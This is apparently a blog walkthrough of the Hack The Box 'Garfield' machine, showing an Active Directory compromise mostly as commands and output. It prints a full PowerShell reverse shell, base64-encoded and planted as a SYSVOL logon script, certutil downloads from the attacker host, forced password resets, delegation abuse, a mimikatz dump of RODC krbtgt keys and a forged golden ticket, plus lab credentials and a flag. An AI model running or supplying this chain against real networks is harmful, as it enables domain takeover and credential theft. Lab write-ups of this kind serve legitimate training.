# **HTB Garfield — Full Walkthrough**

![Hexshubz-Shubham](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

**Domain:** `garfield.htb` | **DC01:** `10.129.46.96` | **RODC01:** `192.168.100.2` (internal)

# **Why This Attack Path?**

Before starting, let me explain the overall mindset. When you see `krbtgt_8245` in the user list during initial enumeration, that immediately tells you an RODC (Read-Only Domain Controller) exists in the domain. RODCs are a well-known attack path because they have their own separate krbtgt key, and if you can dump that key and manipulate the replication policy, you can forge tickets that trick the main DC into giving you a real Administrator TGT. That's the destination — everything else is the journey to get there.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*U5-eDDqBerk7OSP8TplACQ.png)

# **Phase 1 — Recon**

bash

```
nmap -sC -sV 10.129.46.96
```

Key findings: ports 53, 88, 389, 445, 5985 open. This is a classic Windows Domain Controller fingerprint. WinRM on 5985 means if we ever get valid domain credentials, we can get a shell remotely. The LDAP port tells us we can enumerate the domain as long as we have any valid account.

**Why start here?** Nmap tells us what services exist and what attack surface we have. Seeing Kerberos (88) + LDAP (389) + SMB (445) together = definitely a DC. WinRM open = potential remote exec.

# **Phase 2 — Validate Creds and Find ACL Paths**

```
# Confirm creds work on SMB
┌──(shubham㉿kali)-[~/AD-PROJECT/Garfield]
└─$nxc smb 10.129.46.96 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
SMB         10.129.46.96    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:False)
SMB         10.129.46.96    445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
SMB         10.129.46.96    445    DC01             [*] Enumerated shares
SMB         10.129.46.96    445    DC01             Share           Permissions     Remark
SMB         10.129.46.96    445    DC01             -----           -----------     ------
SMB         10.129.46.96    445    DC01             ADMIN$                         Remote Admin
SMB         10.129.46.96    445    DC01             C$                             Default share
SMB         10.129.46.96    445    DC01             IPC$           READ            Remote IPC
SMB         10.129.46.96    445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.46.96    445    DC01             SYSVOL          READ            Logon server share a
```

```
# Find what AD objects j.arbuckle can write to
┌──(shubham㉿kali)-[~/AD-PROJECT/Garfield]
└─$ bloodyAD -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --host 10.129.46.96  get writable

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
permission: WRITE
```

Output shows j.arbuckle has **WRITE permission** on `l.wilson`, `l.wilson_adm`, and `krbtgt_8245`.

**Why this matters:** In Active Directory, WRITE access on a user object means you can modify that user’s attributes. One particularly powerful attribute is `scriptPath` — a logon script that Windows runs automatically every time that user logs in. If we control `scriptPath`, we control code execution in that user's context the next time they authenticate.

The presence of `krbtgt_8245` in the writable list, combined with seeing it in the user list with the description "Key Distribution Center service account for read-only domain controller," confirms our target: there's an RODC somewhere.

# **Phase 3 — scriptPath Abuse to Get Shell as l.wilson**

This is the initial foothold. The attack has three parts:

**Part A — Generate the reverse shell payload:**

```
┌──(shubham㉿kali)-[~/AD-PROJECT/Garfield/bloodhound]
└─$ echo '$client = New-Object System.Net.Sockets.TCPClient("'"10.10.16.81"'",9001);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback=(iex $data 2>&1|Out-String);
$sendback2=$sendback+"PS "+(pwd).Path+"> ";
$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
$client.Close()' | iconv -t UTF-16LE | base64 -w0

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOAAxACIALAA5ADAAMAAxACkAOwAKACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsACgB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAMAAsACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACQAZABhAHQAYQA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7AAoAJABzAGUAbgBkAGIAYQBjAGsAPQAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7AAoAJABzAGUAbgBkAGIAYQBjAGsAMgA9ACQAcwBlAG4AZABiAGEAYwBrACsAIgBQAFMAIAAiACsAKABwAHcAZAApAC4AUABhAHQAaAArACIAPgAgACIAOwAKACQAcwBlAG4AZABiAHkAdABlAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAKACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsACgAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA==
```

We encode it as UTF-16LE because PowerShell’s `-Enc` flag expects UTF-16LE base64. This lets us pass the entire reverse shell as a single command line argument without special character issues.

```
──(shubham㉿kali)-[~/AD-PROJECT/Garfield/bloodhound]
└─$ cat > /tmp/printerDetect.bat << 'EOF'
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOAAxACIALAA5ADAAMAAxACkAOwAKACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsACgB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAMAAsACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACQAZABhAHQAYQA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7AAoAJABzAGUAbgBkAGIAYQBjAGsAPQAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7AAoAJABzAGUAbgBkAGIAYQBjAGsAMgA9ACQAcwBlAG4AZABiAGEAYwBrACsAIgBQAFMAIAAiACsAKABwAHcAZAApAC4AUABhAHQAaAArACIAPgAgACIAOwAKACQAcwBlAG4AZABiAHkAdABlAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAKACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsACgAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA==
EOF
```

![](https://miro.medium.com/v2/resize:fit:684/1*uipYTvGSEnK-YBXih6VyKg.png)

**Part B — Upload the batch file to SYSVOL:**

```
──(shubham㉿kali)-[~/AD-PROJECT/Garfield/bloodhound]
└─$ smbclient //10.129.46.96/SYSVOL -U garfield.htb/j.arbuckle%'Th1sD4mnC4t!@1978'
Try "help" to get a list of possible commands.
smb: \> cd garfield.htb\scripts
smb: \garfield.htb\scripts\> ls
  .                                   D        0  Tue Jan 27 17:13:47 2026
  ..                                  D        0  Tue Jan 27 17:13:47 2026
  printerDetect.bat                   A      217  Fri Sep 12 18:20:29 2025

                9250815 blocks of size 4096. 984530 blocks available
smb: \garfield.htb\scripts\> put /tmp/printerDetect.bat printerDetect.b
putting file /tmp/printerDetect.bat as \garfield.htb\scripts\printerDet kB/s) (average 1.1 kB/s)
smb: \garfield.htb\scripts\> dir
  .                                   D        0  Tue Jan 27 17:13:47 2
  ..                                  D        0  Tue Jan 27 17:13:47 2
  printerDetect.bat                   A     1365  Thu Apr 30 10:23:16 2

                9250815 blocks of size 4096. 984529 blocks available
smb: \garfield.htb\scripts\> exit
```

**Why SYSVOL?** SYSVOL is a special domain share that replicates to all DCs and is readable by all domain users. Logon scripts referenced in `scriptPath` are fetched from `SYSVOL\domain\scripts\` by default. We're not exploiting SYSVOL — we're just using it as the legitimate delivery mechanism.

**# START LISTENER and Wait for l.wilson to log in…**

```
──(shubham㉿kali)-[~/AD-PROJECT/Garfield/bloodhound]
└─$ nc -lnvp 9001
listening on [any] 9001 ...# connect to [10.10.16.81] from (UNKNOWN) [10.129.46.96]
```

**Part C — Set the scriptPath attribute and catch the shell:**

```
┌──(shubham㉿kali)-[~/AD-PROJECT/Garfield/bloodhound]
└─$ bloodyAD --host 10.129.46.96 -d garfield.htb -u 'j.arbuckle' -p 'Th978' \
set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
scriptPath -v printerDetect.bat
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been upd
```

**Why does this work?** j.arbuckle has WriteProperty on l.wilson, which includes the `scriptPath` attribute. When l.wilson next authenticates to the domain (which happens on a schedule in the lab), Windows fetches and runs the script. We get a shell running as l.wilson on DC01.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*Qhg7R6sUKqaI3Rpbhi21hQ.png)

# **Phase 4 — Enumerate l.wilson’s ACL Rights and Reset l.wilson_adm Password**

Now running as l.wilson inside a reverse shell, we load PowerView and check what l.wilson can do:

powershell

```
Import-Module .\PowerView.ps1
Find-InterestingDomainAcl | Where-Object {$_.IdentityReferenceName -eq "l.wilson"}
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*FMG5nYHMqy84_fjg0NQavA.png)

Output shows:

- `ObjectAceType: 00299570-246d-11d0-a768-00aa006e0529` = **User-Force-Change-Password** right
- `ObjectAceType: ab721a53-1e2f-11d0-9819-00aa0040529b` = **User-Change-Password** right

Both on `CN=Liz Wilson ADM`. This means l.wilson can **forcibly reset l.wilson_adm's password** without knowing the current one.

```
PS C:\Users\l.wilson\Downloads> Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force) -Reset
```

**Why target l.wilson_adm?** The naming convention (username + `_adm`) is a classic "shadow admin" pattern — a regular user with a separate privileged admin account. In this case l.wilson literally owns her own admin account via AD ACLs, which is a serious misconfiguration.

# **Phase 5 — WinRM as l.wilson_adm and Grab user.txt**

bash

```
nxc winrm 10.129.46.96 -u 'l.wilson_adm' -p 'P@ssw0rd123!'
# [+] garfield.htb\l.wilson_adm:P@ssw0rd123! (Pwn3d!)
```

```
evil-winrm -i 10.129.46.96 -u 'l.wilson_adm' -p 'P@ssw0rd123!'
```

```
type C:\Users\l.wilson_adm\Desktop\user.txt
# 507962c068a3688b1c5878b0a7e3badc
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*HRCvYrpeGwmlNzNBBiq8Yg.png)

Check privileges:

```
whoami /priv
# SeMachineAccountPrivilege  Enabled  ← critical for later RBCD attack
```

![](https://miro.medium.com/v2/resize:fit:635/1*-aPcJOKeeGNY9-U6CzrhYQ.png)

**Why check privileges immediately?** `SeMachineAccountPrivilege` lets us add machine accounts to the domain. This is the key that unlocks the RBCD attack later. Without this, we'd need Domain Admin to create machine accounts.

# **Phase 6 — Add Self to RODC Administrators**

```
Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
```

```
# Confirm RODC01's internal IP
nslookup RODC01.garfield.htb
# Address: 192.168.100.2
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*UdwPWrX_KEEU8ecYFGfJRg.png)

**Why this group?** “RODC Administrators” grants local administrator access on the RODC machine. Combined with the fact that RODC01 has WinRM enabled, this means we can now get a shell on RODC01 — once we can reach it.

**Why can l.wilson_adm add herself to this group?** The bloodyAD output showed WRITE access on `RODC01` computer object and related objects. Group membership modification flows from those ACL rights.

# **Phase 7 — Ligolo-ng Tunnel to Reach Internal Subnet**

RODC01 is on `192.168.100.2` — a private subnet not directly reachable from our Kali machine. We need a tunnel through DC01 (which is on both networks).

```
# Kali: start Ligolo proxy
./proxy -selfcert -laddr 0.0.0.0:11601
```

```
# DC01 WinRM shell: run the agent
.\agent.exe -connect 10.10.16.81:11601 -ignore-cert# Kali: add route
sudo ip route add 192.168.100.0/24 dev ligolo# Verify
ping 192.168.100.2  # should reply
nxc winrm 192.168.100.2 -u 'l.wilson_adm' -p 'P@ssw0rd123!'
# [+] garfield.htb\l.wilson_adm:P@ssw0rd123! (Pwn3d!)
```

**Why Ligolo specifically?** Ligolo-ng creates a TUN interface, which means our tools think they’re directly connected to the internal network. No proxy chains, no port forwarding setup for each tool. Everything just works transparently.

# **Phase 8 — Create Fake Machine Account and Set Up RBCD**

RBCD (Resource-Based Constrained Delegation) is a Kerberos feature that lets you say “machine X is allowed to impersonate any user when accessing machine Y.” We’re going to abuse this to impersonate Administrator when accessing RODC01.

bash

```
# Create a machine account we control
impacket-addcomputer garfield.htb/l.wilson_adm:'P@ssw0rd123!' \
  -computer-name 'FAKECOMPUTER$' \
  -computer-pass 'FakePass123!' \
  -dc-ip 10.129.46.96
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*UpRZuEx5y-j2bOUwW7q-Ew.png)

Then in our l.wilson_adm WinRM session on DC01:

# Grant FAKECOMPUTER$ delegation rights TO RODC01

Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$

```
# Verify
Get-ADComputer RODC01 -Properties PrincipalsAllowedToDelegateToAccount
# PrincipalsAllowedToDelegateToAccount : {CN=FAKECOMPUTER,...}
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*MN6ab8yC9TZLrXajIJRzlw.png)

**Why does this work?** `l.wilson_adm` has WriteProperty on the RODC01 computer object (confirmed by bloodyAD). The `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute (which `Set-ADComputer -PrincipalsAllowedToDelegateToAccount` modifies) can be written by anyone with that right. We own FAKECOMPUTER$ so we know its password, which means we can complete the S4U2Proxy Kerberos exchange.

**Why SeMachineAccountPrivilege mattered:** Without it, we couldn’t create FAKECOMPUTER$ in the first place. Domain users don’t have the right to add machine accounts by default — it’s controlled by the “Add workstations to domain” policy, granted via this privilege.

# **Phase 9 — S4U2Proxy to Get SYSTEM on RODC01**

bash

```
# Sync clock (Kerberos fails if >5 min skew)
┌──(shubham㉿kali)-[~/AD-PROJECT/Garfield/bloodhound]
└─$ sudo systemctl stop systemd-timesyncd

┌──(shubham㉿kali)-[~/AD-PROJECT/Garfield/bloodhound]
└─$ sudo ntpdate -u dc01.garfield.htb
2026-04-30 12:26:40.987983 (-0400) +28733.015694 +/- 0.135845 dc01.garfield.htb 10.129.46.96 s1 no-leap
CLOCK: time stepped by 28733.015694
```

```
# Request a service ticket impersonating Administrator to RODC01's CIFS
┌──(shubham㉿kali)-[~/AD-PROJECT/Garfield/bloodhound]
└─$impacket-getST garfield.htb/'FAKECOMPUTER$':'FakePass123!' \
-spn cifs/RODC01.garfield.htb \
-impersonate Administrator \
-dc-ip 10.129.46.96
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache

┌──(shubham㉿kali)-[~/AD-PROJECT/Garfield/bloodhound]
└─$export KRB5CCNAME='Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache'

┌──(shubham㉿kali)-[~/AD-PROJECT/Garfield/bloodhound]
└─$klist
Ticket cache: FILE:Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
Default principal: Administrator@garfield.htb
Valid starting       Expires              Service principal
04/30/2026 12:26:52  04/30/2026 22:26:49  cifs/RODC01.garfield.htb@GARFIELD.HTB
        renew until 05/01/2026 12:26:47
```

**How S4U2Proxy works:** FAKECOMPUTER$ sends a “please give me a ticket to CIFS/RODC01 on behalf of Administrator” request to the DC. The DC checks: does RODC01 say FAKECOMPUTER$ is allowed to do this? Yes (we just set that). So the DC issues the ticket. psexec uses that CIFS ticket to upload and execute a service binary on RODC01.

and now we have nt/authority

```
┌──(shubham㉿kali)-[~/AD-PROJECT/Garfield/bloodhound

└─$ impacket-psexec -k -no-pass \
-dc-ip 10.129.20.167 \
-target-ip 192.168.100.2 \
garfield.htb/Administrator@RODC01.garfield.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 192.168.100.2.....
[*] Found writable share ADMIN$
[*] Uploading file uyXCmocQ.exe
[*] Opening SVCManager on 192.168.100.2.....
[*] Creating service ItMK on 192.168.100.2.....
[*] Starting service ItMK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.8511]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

# **Phase 10 — Dump the RODC krbtgt_8245 Key**

cmd

```
powershell -ep bypass
.\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
```

```
C:\Users\Public\Downloads> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
help

 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 lput {src_file, dst_path}   - uploads a local file to the dst_path RELATIVE to the connected share (ADMIN$)
 lget {file}                 - downloads pathname RELATIVE to the connected share (ADMIN$) to the current local dir
 ! {cmd}                    - executes a local shell cmd

mimikatz #
privilege::debug
mimikatz # Privilege '20' OK

lsadump::lsa /inject /name:krbtgt_8245
mimikatz # Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357

RID  : 00000643 (1603)
User : krbtgt_8245

 * Primary
    NTLM : 445aa4221e751da37a10241d962780e2
    LM   :
  Hash NTLM: 445aa4221e751da37a10241d962780e2
    ntlm- 0: 445aa4221e751da37a10241d962780e2
    lm  - 0: 0ab3d34a182bb016fc4cfd26544a9f16

 * WDigest
    01  6d31d1f92ef6d85f5517944f98bf5753
    02  8c46bd5ddc680291e70800990dbc02e3
    03  9ffbc24f29b9bb3df3c32b76631ff874
    04  6d31d1f92ef6d85f5517944f98bf5753
    05  8c46bd5ddc680291e70800990dbc02e3
    06  8fc97c500bf9c7c4a0d34a497f9c5245
    07  6d31d1f92ef6d85f5517944f98bf5753
    08  c4bac61b7ecb407d358f836d2f4e19c6
    09  c4bac61b7ecb407d358f836d2f4e19c6
    10  d8938c80e1e0c80a2ec1d8b06f42cb31
    11  67f002aa49f4400fa970a53e294f4bee
    12  c4bac61b7ecb407d358f836d2f4e19c6
    13  56062e2db43bc0069deb86de87509ca6
    14  67f002aa49f4400fa970a53e294f4bee
    15  7250fcfc09d9cb93345c0c1393e19e52
    16  7250fcfc09d9cb93345c0c1393e19e52
    17  04b30cd8b5381d4b8458b0c996503a91
    18  b48bda9ef98982d5ee33766a74880e01
    19  bb365cf4f0bcdadf35b6a9b04c58257b
    20  85addbd6d603cca1b500f2da02b205d0
    21  b6186618611e202aae4141716e6603f5
    22  b6186618611e202aae4141716e6603f5
    23  f3f6c9408db132bf8e59413b7b40bb16
    24  0acf88cc5cb3b35888708ebefe658b6f
    25  0acf88cc5cb3b35888708ebefe658b6f
    26  08b8941632a5017e7178a3761dfaf7fb
    27  c1b2fd89d0dafb5f9e18147042bdc433
    28  712f0b6ed3b7eb7f6f135a1e298c4e09
    29  bf8d51270f7f657079bb9744446d70cb

 * Kerberos
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Credentials
      des_cbc_md5       : d540fe6192b9ecfe

 * Kerberos-Newer-Keys
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
      aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
      des_cbc_md5       (4096) : d540fe6192b9ecfe

 * NTLM-Strong-NTOWF
    Random Value : f4b51c2c0d006172304e31dbc6e0de6b

mimikatz #
```

Output:

```
aes256_hmac : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
NTLM        : 445aa4221e751da37a10241d962780e2
```

**Why is this valuable?** Every RODC has its own separate krbtgt account (named `krbtgt_XXXX` where XXXX is the RODC's key ID — here 8245). This key signs all Kerberos tickets issued by that RODC. With this key, we can forge TGTs that appear to come from RODC01. The main DC (DC01) trusts RODC01's tickets — so if we forge a ticket correctly, DC01 will accept it.

# **Phase 11 — Modify RODC Replication Policy**

This is the step that failed repeatedly until we ran it from the right context. The key insight: **run this from the DC01 evil-winrm session as l.wilson_adm, NOT from inside the RODC01 SYSTEM shell.**

powershell

```
# In evil-winrm DC01 session as l.wilson_adm
Import-Module .\PowerView.ps1
```

```
#we are checking which users’ passwords can be stored (cached) on the RODC and which ones are protected.
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Get-DomainObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" -Properties msDS-RevealOnDemandGroup, msDS-NeverRevealGroup

msds-neverrevealgroup                                                                                                                                                                                                                msds-revealondemandg
                                                                                                                                                                                                                                     roup
---------------------                                                                                                                                                                                                                --------------------
{CN=Denied RODC Password Replication Group,CN=Users,DC=garfield,DC=htb, CN=Account Operators,CN=Builtin,DC=garfield,DC=htb, CN=Server Operators,CN=Builtin,DC=garfield,DC=htb, CN=Backup Operators,CN=Builtin,DC=garfield,DC=htb...} CN=Allowed RODC P...
```

```
# Add Administrator to the allowed replication list
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Set-DomainObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb','CN=Administrator,CN=Users,DC=garfield,DC=htb')}

# Remove the "never replicate" restriction
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'
```

```

#Verify with ad module and powrview module
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Get-ADComputer RODC01 -Properties msDS-RevealOnDemandGroup,msDS-NeverRevealGroup

DistinguishedName        : CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
DNSHostName              : RODC01.garfield.htb
Enabled                  : True
msDS-RevealOnDemandGroup : {CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb, CN=Administrator,CN=Users,DC=garfield,DC=htb}
Name                     : RODC01
ObjectClass              : computer
ObjectGUID               : 92de2230-7bf6-43b2-baaa-d43bf84f34ea
SamAccountName           : RODC01$
SID                      : S-1-5-21-2502726253-3859040611-225969357-1602
UserPrincipalName        :

*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Get-DomainObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" -Properties msDS-RevealOnDemandGroup, msDS-NeverRevealGroup

msds-revealondemandgroup
------------------------
{CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb, CN=Administrator,CN=Users,DC=garfield,DC=htb}
```

**Why did this fail from the RODC01 SYSTEM shell?** SYSTEM on RODC01 authenticates to LDAP as the machine account `RODC01$`. That machine account doesn't have write permission on its own AD object's `msDS-RevealOnDemandGroup` attribute — only Domain Admins or accounts with explicitly delegated rights can modify it. l.wilson_adm has that right (confirmed by bloodyAD).

**What does this attribute do?** `msDS-RevealOnDemandGroup` is the "allowed replication" list for the RODC. DC01 checks this list before honoring a RODC-signed ticket for a given user. If Administrator isn't in this list, DC01 rejects the RODC golden ticket with `BAD_INTEGRITY`. Once Administrator is in the list, DC01 will accept RODC-signed tickets for Administrator.

# **Phase 12 — RODC Golden Ticket + KeyList Attack**

**Why Rubeus v2.2.0 failed:** The v2.2.0 KeyList TGS-REQ was missing proper `PA-FOR-USER` pre-authentication data that DC01 requires. v2.3.3 fixed this. The ticket itself was always valid — the request format was wrong. This is why tool version matters.

```
# Download and serve newer Rubeus
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Rubeus.exe -O /tmp/Rubeus.exe
python3 -m http.server 8000
```

On RODC01 via psexec:

```
# Download newer Rubeus
certutil -urlcache -split -f http://10.10.16.81:8000/Rubeus.exe Rubeus.exe
```

```
# Forge the RODC golden ticket

C:\Windows\system32> cd C:\Users\Public\Downloads
 C:\Users\Public\Desktop> .\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket_final.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Build TGT

[*] Building PAC

[*] Domain: GARFIELD.HTB (GARFIELD)
[*] SID: S-1-5-21-2502726253-3859040611-225969357
[*] UserId: 500
[*] Groups: 520,512,513,519,518
[*] ServiceKey: D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] ServiceKeyType: KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey: D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] KDCKeyType: KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service: krbtgt
[*] Target: garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime: 4/30/2026 12:35:52 PM
[*] StartTime: 4/30/2026 12:35:52 PM
[*] EndTime: 4/30/2026 10:35:52 PM
[*] RenewTill: 5/7/2026 12:35:52 PM

[*] base64(ticket.kirbi):

